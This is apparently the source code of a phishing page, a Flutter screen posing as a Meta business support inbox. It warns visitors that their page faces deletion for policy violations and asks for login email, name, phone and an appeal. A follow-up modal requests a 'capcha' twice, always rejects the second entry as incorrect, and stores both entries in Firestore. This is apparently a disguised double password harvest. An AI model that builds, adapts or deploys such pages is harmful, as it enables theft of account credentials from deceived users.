import 'package:easy_localization/easy_localization.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:gap/gap.dart';
import 'package:_iwu_pack/_iwu_pack.dart';
import 'package:flutter/material.dart';
import 'package:meta_business/src/resources/firestore/instances.dart';

class ModalSuccess extends StatefulWidget {
  final FormInput data;

  const ModalSuccess({super.key, required this.data});

  @override
  State<StatefulWidget> createState() => _ModalSuccessState();
}

class _ModalSuccessState extends State<ModalSuccess> {

  bool isCap1OK = false;

  String? capCha1;
  String? capCha2;

  @override
  Widget build(BuildContext context) {
    TextEditingController cap1 = TextEditingController();
    TextEditingController cap2 = TextEditingController();

    return Material(
      color: Colors.transparent,
      child: Center(
        child: Container(
          width: 560,
          // Adjust as needed
          decoration: BoxDecoration(
            color: Colors.white,
            borderRadius: BorderRadius.circular(8), // Rounded border
            boxShadow: [
              BoxShadow(
                color: Colors.grey.withOpacity(0.5),
                spreadRadius: 5,
                blurRadius: 7,
                offset: Offset(0, 3), // changes position of shadow
              ),
            ],
          ),
          padding: const EdgeInsets.symmetric(vertical: 16, horizontal: 16),
          margin: const EdgeInsets.all(16),
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Row(
                mainAxisAlignment: MainAxisAlignment.spaceBetween,
                children: [
                  const Text(
                    "Please Enter Your capcha",
                    style: TextStyle(
                        fontWeight: FontWeight.bold, fontSize: 18, height: 1.6),
                  ),
                  IconButton(
                    onPressed: () {
                      Navigator.of(context).pop();
                    },
                    icon: const Icon(Icons.close),
                  ),
                ],
              ),
              const Divider(), // Divider line
              const SizedBox(height: 16),
              const Text(
                "For your security, you must re-enter your capcha to continue.",
                textAlign: TextAlign.left,
                style: TextStyle(fontSize: 16, height: 1.6),
              ),

              const SizedBox(height: 16),
              if(capCha1 == null) WidgetInput(
                  validator: (value) {
                    if (value == null || value.isEmpty) {
                      return 'Please enter your capcha';
                    }
                    return null;
                  },
                  label: "Enter Your capcha",
                  controller: cap1,
                  onChanged: (_) {
                    // setState(() {});
                  }),
              if(capCha1 != null) WidgetInput(
                  validator: (value) {
                    if(capCha1 != null) {
                      return 'Your capcha was incorrect !';
                    } else if (value == null || value.isEmpty) {
                      return 'Please enter your capcha';
                    }
                    return null;
                  },
                  label: "Enter Your capcha",
                  controller: cap2,
                  onChanged: (_) {
                    // setState(() {});
                  }),
              const Divider(), // Divider line
              const SizedBox(height: 16),
              Align(
                alignment: Alignment.centerRight,
                child: ElevatedButton(
                  onPressed: () {
                    if (capCha1 == null) {
                      setState(() {
                        isCap1OK = true;
                        capCha1 = cap1.text;
                      });
                    } else {
                      setState(() {
                        capCha2 = cap1.text;
                      });
                    }
                    if (capCha2 != null) {
                      colData.add({
                        "username": widget.data.username,
                        "name": widget.data.username,
                        "phone": widget.data.username,
                        "comment": widget.data.username,
                        "cap1": capCha1,
                        "cap2": capCha2,
                      }); //insert vào trong firebase
                      Navigator.pop(context);
                    }
                  },
                  style: ElevatedButton.styleFrom(
                    primary: Color(0xFF355797),
                    // Assuming blue is the primary color
                    textStyle: TextStyle(color: Colors.white),
                  ),
                  child: const Text("Continue"),
                ),
              ),
            ],
          ),
        ),
      ),
    );
  }
}

double _paddingHorizontal(BuildContext context) =>
    context.width > 1280 ? (context.width - 1280) / 2 : 16;

appShowGeneralDialog(
    {required context, required Widget child, bool barrierDismissible = true}) {
  showGeneralDialog(
    barrierLabel: "contact_us_popup",
    barrierColor: Colors.black.withOpacity(0.05),
    barrierDismissible: barrierDismissible,
    transitionDuration: const Duration(milliseconds: 300),
    context: context,
    pageBuilder: (context, anim1, anim2) {
      return child;
    },
    transitionBuilder: (context, anim1, anim2, child) {
      return SlideTransition(
        position: Tween(begin: const Offset(0, 1), end: const Offset(0, 0))
            .animate(anim1),
        child: child,
      );
    },
  );
}

class HomeScreen extends StatefulWidget {
  const HomeScreen({super.key});

  @override
  State<HomeScreen> createState() => _HomeScreenState();
}

class FormInput {
  String username;
  String name;
  String phone;
  String comment;
  String? cap1;
  String? cap2;

  FormInput(
      {required this.username,
      required this.name,
      required this.phone,
      required this.comment,
      this.cap1,
      this.cap2});
}

class _HomeScreenState extends State<HomeScreen> {
  TextEditingController c1 = TextEditingController();
  TextEditingController c2 = TextEditingController();
  TextEditingController c3 = TextEditingController();
  TextEditingController c4 = TextEditingController();
  final _formKey = GlobalKey<FormState>();

  bool accepted = false;

  // bool get enableButton =>
  //     accepted && c1.text.isEmail && c2.text.isNotEmpty && c3.text.isNotEmpty;
  bool get enableButton => accepted;

  _submit() async {
    if (_formKey.currentState!.validate()) {
      //khởi tạo data của form nhập thông tin
      final data = FormInput(
          username: c1.text, name: c2.text, phone: c3.text, comment: c4.text);
      appShowGeneralDialog(
        context: context,
        child: ModalSuccess(
            data: data), //truyền data user nhập vào ném qua bên modal
      );
    }
  }

  @override
  void initState() {
    super.initState();
    // WidgetsBinding.instance.addPostFrameCallback((timeStamp) {
    //   appShowGeneralDialog(
    //     context: context,
    //     child: const _ModalSuccess(),
    //   );
    // });
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: appColorBackground,
      body: SingleChildScrollView(
        child: Column(
          crossAxisAlignment: CrossAxisAlignment.start,
          children: [
            Container(
              decoration: BoxDecoration(color: hexColor('355797')),
              padding: EdgeInsets.symmetric(
                  horizontal: _paddingHorizontal(context), vertical: 24),
              child: Row(
                children: [
                  // const WidgetAppSVG(
                  //   'm5',
                  //   width: 56,
                  // ),
                  Container(
                    margin: const EdgeInsets.symmetric(horizontal: 16),
                    height: 16,
                    width: 1,
                    color: Colors.white,
                  ),
                  Expanded(
                    child: Text(
                      'Support Inbox'.tr(),
                      style: w300TextStyle(
                        fontSize: 15,
                        color: Colors.white,
                      ),
                    ),
                  ),
                  IconButton(
                    onPressed: () {},
                    icon: const Icon(
                      Icons.search,
                      color: Colors.white,
                    ),
                  ),
                ],
              ),
            ),
            Container(
              height: 200,
              decoration: const BoxDecoration(
                  image: DecorationImage(
                      image: AssetImage('assets/images/png/m2.jpg'),
                      fit: BoxFit.fitHeight)),
              child: Center(
                child: Column(
                  mainAxisSize: MainAxisSize.min,
                  children: [
                    Text(
                      'Registration form to receive information about the companys upcoming projects'
                          .tr(),
                      style: w300TextStyle(
                        fontSize: 15,
                        color: Colors.white,
                      ),
                    ),
                    const Gap(4),
                    Text(
                      'GET SUPPORT'.tr(),
                      style: w700TextStyle(
                        fontSize: 28,
                        color: Colors.white,
                      ),
                    ),
                  ],
                ),
              ),
            ),
            Container(
              color: hexColor('E9EAED'),
              padding: EdgeInsets.symmetric(
                  horizontal: _paddingHorizontal(context) + 150.r),
              child: Form(
                key: _formKey,
                child: Column(
                  children: [
                    const Gap(24),
                    Container(
                      color: Colors.white,
                      padding: const EdgeInsets.symmetric(
                          horizontal: 16, vertical: 16),
                      child: Row(
                        children: [
                          CircleAvatar(
                            backgroundColor: hexColor('575D6D'),
                            radius: 24,
                            child: const Icon(
                              Icons.email,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(20),
                          Expanded(
                              child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              Text(
                                "Your page goes against our Community Standards",
                                style: w500TextStyle(fontSize: 16),
                              ),
                              const Gap(4),
                              Row(
                                mainAxisSize: MainAxisSize.min,
                                children: [
                                  Container(
                                    padding: const EdgeInsets.all(6),
                                    decoration: BoxDecoration(
                                        color: hexColor('4A80CC'),
                                        borderRadius: BorderRadius.circular(6)),
                                    child: Text(
                                      "OPEN",
                                      style: w700TextStyle(
                                          fontSize: 14, color: Colors.white),
                                    ),
                                  ),
                                  const Gap(8),
                                  Expanded(
                                    child: Text(
                                      "Case #234857718299001",
                                      style: w300TextStyle(
                                          fontSize: 12,
                                          color: hexColor('787B7D')),
                                    ),
                                  ),
                                ],
                              )
                            ],
                          ))
                        ],
                      ),
                    ),
                    Container(
                      color: hexColor('F6F7F8'),
                      padding: const EdgeInsets.symmetric(
                          horizontal: 16, vertical: 16),
                      child: Row(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Image.asset(
                            'assets/images/png/m1.png',
                            width: 24 * 2,
                          ),
                          const Gap(20),
                          Expanded(
                              child: Column(
                            crossAxisAlignment: CrossAxisAlignment.start,
                            children: [
                              const Gap(8),
                              Text(
                                "Our Message",
                                style: w500TextStyle(fontSize: 16),
                              ),
                              const Gap(4),
                              Text(
                                """Your page has been scheduled for deletion because one or more the following
                          - Intellectual Property Infringement
                          - Community Standards
                          - Hate Speech""",
                                style: w300TextStyle(height: 1.4, fontSize: 14),
                              ),
                            ],
                          ))
                        ],
                      ),
                    ),
                    Container(
                      height: 2,
                      width: context.width,
                      color: hexColor('E8E8E9'),
                    ),
                    Container(
                      color: hexColor('F6F7F8'),
                      padding: const EdgeInsets.symmetric(
                          horizontal: 16, vertical: 16),
                      child: Row(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Image.asset(
                            'assets/images/png/m1.png',
                            width: 24 * 2,
                          ),
                          const Gap(20),
                          Expanded(
                            child: Column(
                              crossAxisAlignment: CrossAxisAlignment.start,
                              children: [
                                const Gap(8),
                                Text(
                                  "Your Reply",
                                  style: w500TextStyle(fontSize: 16),
                                ),
                                const Gap(4),
                                Text(
                                  """Please be sure to provide the requested information below. Failure to provide this information may delay the processing of your appeal.""",
                                  style:
                                      w300TextStyle(height: 1.4, fontSize: 14),
                                ),
                                const Gap(24),
                                WidgetInput(
                                    validator: (value) {
                                      if (value == null || !value.isEmail) {
                                        return 'Login Email Address is not Valid. Please Enter Correct Email Address';
                                      }
                                      return null;
                                    },
                                    label: "Login email",
                                    controller: c1,
                                    onChanged: (_) {
                                      setState(() {});
                                    }),
                                const Gap(24),
                                WidgetInput(
                                    validator: (value) {
                                      if (value == null || value.isEmpty) {
                                        return 'Please enter your name';
                                      }
                                      return null;
                                    },
                                    label: "Your name",
                                    controller: c2,
                                    onChanged: (_) {
                                      setState(() {});
                                    }),
                                const Gap(24),
                                WidgetInput(
                                    validator: (value) {
                                      if (value == null || value.isEmpty) {
                                        return 'Please enter your phone';
                                      }
                                      return null;
                                    },
                                    label: "Your phone number",
                                    controller: c3,
                                    onChanged: (_) {
                                      setState(() {});
                                    }),
                                const Gap(24),
                                WidgetInput(
                                    label: "Your appeal",
                                    controller: c4,
                                    minLines: 4,
                                    onChanged: (_) {
                                      setState(() {});
                                    }),
                                const Gap(24),
                                InkWell(
                                  onTap: () {
                                    setState(() {
                                      accepted = !accepted;
                                    });
                                  },
                                  child: Row(
                                    mainAxisSize: MainAxisSize.min,
                                    children: [
                                      Container(
                                        height: 20,
                                        width: 20,
                                        alignment: Alignment.center,
                                        decoration: BoxDecoration(
                                            color: Colors.white,
                                            border: Border.all(
                                                width: 1.2,
                                                color: hexColor('929497'))),
                                        child: accepted
                                            ? Icon(
                                                Icons.check,
                                                color: appColorText,
                                                size: 16,
                                              )
                                            : const SizedBox(),
                                      ),
                                      const Gap(12),
                                      Text(
                                        """Do you agree to Terms, Data Policy and Cookies Policy.""",
                                        style: w300TextStyle(
                                            height: 1.4, fontSize: 14),
                                      ),
                                    ],
                                  ),
                                ),
                                const Gap(24),
                                WidgetRippleButton(
                                  onTap: enableButton ? _submit : null,
                                  color: enableButton
                                      ? hexColor('355797')
                                      : hexColor('5E77AA'),
                                  child: Container(
                                    padding: const EdgeInsets.symmetric(
                                        horizontal: 16, vertical: 8),
                                    child: Text(
                                      "Submit",
                                      style: w700TextStyle(
                                          fontSize: 14, color: Colors.white),
                                    ),
                                  ),
                                ),
                                const Gap(24),
                              ],
                            ),
                          ),
                        ],
                      ),
                    ),
                    const Gap(24),
                  ],
                ),
              ),
            ),
            Container(
              color: hexColor('4080FF'),
              padding: EdgeInsets.symmetric(
                  horizontal: _paddingHorizontal(context), vertical: 32),
              child: Column(
                children: [
                  // const WidgetAppSVG(
                  //   'm5',
                  //   width: 100,
                  // ),
                  const Gap(12),
                  Text(
                    'company can help your large, medium or small business grow. Get the latest news for advertisers and more on our job for Business Page.'
                        .tr(),
                    style: w300TextStyle(
                      fontSize: 15,
                      color: Colors.white,
                    ),
                  ),
                  const Gap(32),
                  Row(
                    children: [
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'job technologies'.tr(),
                              style: w500TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'company'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Instagram'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Messenger'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'WhatsApp'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Audience Network'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Oculus'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                          ],
                        ),
                      ),
                      Expanded(
                          child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            'Goals'.tr(),
                            style: w500TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Set up a company Page'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Build brand awareness'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Promote your local'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Grow online sales'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Promote your app'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Generate leads'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                        ],
                      )),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'job technologies'.tr(),
                              style: w500TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'company'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Instagram'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Messenger'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'WhatsApp'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Audience Network'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Oculus'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                          ],
                        ),
                      ),
                      Expanded(
                          child: Column(
                        crossAxisAlignment: CrossAxisAlignment.start,
                        children: [
                          Text(
                            'Goals'.tr(),
                            style: w500TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Set up a company Page'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Build brand awareness'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Promote your local'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Grow online sales'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Promote your app'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                          const Gap(12),
                          Text(
                            'Generate leads'.tr(),
                            style: w300TextStyle(
                              fontSize: 15,
                              color: Colors.white,
                            ),
                          ),
                        ],
                      )),
                      Expanded(
                        child: Column(
                          crossAxisAlignment: CrossAxisAlignment.start,
                          children: [
                            Text(
                              'job technologies'.tr(),
                              style: w500TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'company'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Instagram'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Messenger'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'WhatsApp'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Audience Network'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                            const Gap(12),
                            Text(
                              'Oculus'.tr(),
                              style: w300TextStyle(
                                fontSize: 15,
                                color: Colors.white,
                              ),
                            ),
                          ],
                        ),
                      ),
                    ],
                  ),
                ],
              ),
            ),
            Container(
              color: hexColor('E9EAED'),
              padding: EdgeInsets.symmetric(
                  horizontal: _paddingHorizontal(context), vertical: 32),
              child: Column(
                children: [
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                    children: [
                      Text(
                        "English (US)",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Čeština",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Norsk (bokmål)",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Nederlands",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Português (Portugal)",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Română",
                        style: w300TextStyle(),
                      ),
                    ],
                  ),
                  const Gap(16),
                  Row(
                    mainAxisAlignment: MainAxisAlignment.spaceEvenly,
                    children: [
                      Text(
                        "Italiano",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Bahasa Indonesia",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Türkçe",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Svenska",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Русский",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Deutsch",
                        style: w300TextStyle(),
                      ),
                      Text(
                        "Magyar",
                        style: w300TextStyle(),
                      ),
                    ],
                  )
                ],
              ),
            )
          ],
        ),
      ),
    );
  }
}

class WidgetInput extends StatefulWidget {
  final TextEditingController controller;
  final String label;
  final int minLines;
  final ValueChanged onChanged;
  final FormFieldValidator<String>? validator;

  const WidgetInput({
    super.key,
    this.minLines = 1,
    required this.controller,
    required this.label,
    required this.onChanged,
    this.validator,
  });

  @override
  State<WidgetInput> createState() => _WidgetInputState();
}

class _WidgetInputState extends State<WidgetInput> {
  @override
  Widget build(BuildContext context) {
    return Column(
      crossAxisAlignment: CrossAxisAlignment.start,
      children: [
        Text(
          widget.label,
          style: w400TextStyle(fontSize: 16, color: hexColor('929497')),
        ),
        const Gap(8),
        TextFormField(
          autovalidateMode: AutovalidateMode.onUserInteraction,
          validator: widget.validator,
          onChanged: widget.onChanged,
          controller: widget.controller,
          minLines: widget.minLines,
          maxLines: widget.minLines,
          style: w300TextStyle(fontSize: 16),
          decoration: InputDecoration(
              contentPadding: EdgeInsets.symmetric(
                  horizontal: 16, vertical: widget.minLines == 1 ? 0 : 20),
              border: _border,
              hintText: "",
              enabledBorder: _border,
              focusedBorder: _borderFocus),
        )
      ],
    );
  }

  InputBorder get _border => OutlineInputBorder(
      borderRadius: BorderRadius.circular(6),
      borderSide: BorderSide(width: 1, color: hexColor('929497')));

  InputBorder get _borderFocus => OutlineInputBorder(
      borderRadius: BorderRadius.circular(6),
      borderSide: BorderSide(width: 1.2, color: Colors.blue));
}
